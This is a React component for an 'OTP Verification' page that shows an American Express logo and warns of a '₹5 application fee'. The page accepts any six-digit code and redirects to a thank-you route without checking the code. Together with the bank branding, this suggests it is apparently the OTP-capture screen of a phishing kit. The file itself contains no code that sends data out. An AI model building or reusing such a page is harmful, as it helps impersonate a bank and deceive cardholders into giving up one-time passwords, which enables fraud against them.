import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import logo from '../assets/logo-american-express-computer-icons-sign-payment-american-express-86dd053d422618121424f442038de874.png'

const OTP_LENGTH = 6;
const TIMER_SECONDS = 120;

const OtpPage: React.FC = () => {
  const [otp, setOtp] = useState('');
  const [timer, setTimer] = useState(TIMER_SECONDS);
  const [error, setError] = useState('');
  const navigate = useNavigate();

  useEffect(() => {
    if (timer === 0) return;
    const interval = setInterval(() => {
      setTimer((prev) => prev - 1);
    }, 1000);
    return () => clearInterval(interval);
  }, [timer]);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, OTP_LENGTH);
    setOtp(value);
    setError('');
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length !== OTP_LENGTH) {
      setError('Please enter the 6-digit OTP.');
      return;
    }
    navigate('/thanks');
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gray-50">
      <div className="bg-white p-6 rounded shadow w-full max-w-sm">
        <div className="flex justify-center mb-4">
          <img src={logo} alt="AMEX" className="h-10" />
        </div>
        <h2 className="text-xl font-bold mb-2 text-center">OTP Verification</h2>
        <p className="text-center mb-4">₹5 application fees will be charged!</p>
        <form onSubmit={handleSubmit} className="space-y-4">
          <input
            type="tel"
            value={otp}
            onChange={handleChange}
            maxLength={OTP_LENGTH}
            className="w-full border rounded px-3 py-2 text-center text-xl tracking-widest"
            placeholder="Enter OTP"
            autoFocus
          />
          <div className="text-right text-sm text-gray-500">{otp.length}/{OTP_LENGTH}</div>
          <div className="text-center text-gray-600 mb-2">
            Time Remaining: {timer} second{timer !== 1 ? 's' : ''}
          </div>
          {error && <div className="text-red-500 text-center text-sm">{error}</div>}
          <button
            type="submit"
            className="w-full bg-blue-600 text-white py-2 rounded disabled:opacity-50"
            disabled={timer === 0}
          >
            Verify OTP
          </button>
        </form>
      </div>
    </div>
  );
};

export default OtpPage;
